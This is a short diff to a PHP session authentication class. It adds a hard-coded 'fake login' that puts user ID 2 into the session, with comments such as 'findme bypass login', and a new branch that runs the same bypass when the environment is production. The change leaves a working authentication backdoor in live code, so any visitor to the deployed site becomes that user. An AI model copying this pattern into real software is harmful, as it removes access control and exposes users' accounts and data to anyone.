@@ -96,6 +96,16 @@ class SessionAuthenticationService implements AuthenticationServiceInterface
         // if ($_ENV['APP_ENV'] === 'development' && empty($this->session->get(self::SESSION_USER_ID))) {
         if ($_ENV['APP_ENV'] === 'development') {
             // Replace 1 with your test user ID
+            // FikHack - FAKE LOGIN with fakeUserId // findme bypass login // findme bypass security
+            $fakeUserId = 2; // hack
+            $testUser = $this->userRepository->findById($fakeUserId);
+            if ($testUser) {
+                $this->storeUserInSession($testUser);
+                $this->setupStoreContext($testUser);
+                $this->currentUser = $testUser;
+            }
+        } elseif ($_ENV['APP_ENV'] === 'production') {
+            // Replace 1 with your test user ID
             // FikHack - FAKE LOGIN with fakeUserId
             $fakeUserId = 2; // hack
             $testUser = $this->userRepository->findById($fakeUserId);
@@ -105,7 +115,6 @@ class SessionAuthenticationService implements AuthenticationServiceInterface
                 $this->currentUser = $testUser;
             }
         }
-
 
         // Auto-login from remember me cookie if available
         $this->attemptRememberMeLogin();
